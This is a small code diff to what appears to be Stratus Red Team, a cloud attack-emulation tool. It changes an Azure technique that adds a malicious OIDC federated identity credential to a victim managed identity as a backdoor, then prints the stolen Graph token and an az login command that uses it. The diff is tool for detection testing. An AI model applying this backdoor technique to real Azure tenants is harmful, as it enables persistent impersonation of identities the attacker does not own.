@@ -33,7 +33,6 @@ const (
 	oidcContainerName = "oidc"
 	oidcSubject       = "stratus-red-team-oidc"
 	oidcAudience      = "api://AzureADTokenExchange"
-	ficName           = "stratus-red-team-oidc-fic"
 	tokenTTL          = 10 * time.Minute
 	ficWaitTime       = 30 * time.Second
 )
@@ -128,6 +127,7 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	resourceGroupName := params["resource_group_name"]
 	storageAccountName := params["storage_account_name"]
 	blobServiceURL := params["blob_service_url"]
+	suffix := params["random_suffix"]
 
 	azureProvider := providers.Azure()
 
@@ -164,6 +164,7 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	ficIssuer := issuerURL
 	ficSubject := oidcSubject
 	ficAudiences := []*string{strPtr(oidcAudience)}
+	ficName := fmt.Sprintf("stratus-red-team-oidc-fic-%s", suffix)
 
 	ficParams := armmsi.FederatedIdentityCredential{
 		Properties: &armmsi.FederatedIdentityCredentialProperties{
@@ -198,11 +199,11 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	}
 
 	log.Println("Obtained victim managed identity access token via malicious OIDC FIC backdoor")
-	log.Println("\nVictim managed identity Microsoft Graph token:")
-	log.Println(victimToken)
+	log.Println("Victim managed identity Microsoft Graph token:")
+	log.Println("\n" + victimToken)
 
-	log.Println("\nYou can now use this token to access Microsoft Graph API as the victim managed identity:")
-	log.Println("\nWARNING: Using this command in your current CLI session will change your Azure context. You will need to LOG IN AGAIN to clean up this technique.")
+	log.Println("You can now use this token to access Microsoft Graph API as the victim managed identity:")
+	log.Println("WARNING: Using this command in your current CLI session will change your Azure context. You will need to LOG IN AGAIN to clean up this technique.")
 	log.Println("\naz login --service-principal --allow-no-subscriptions --tenant " + tenantId + " --username " + managedIdentityClientId + " --federated-token \"" + oidcToken + "\"")
 
 	return nil
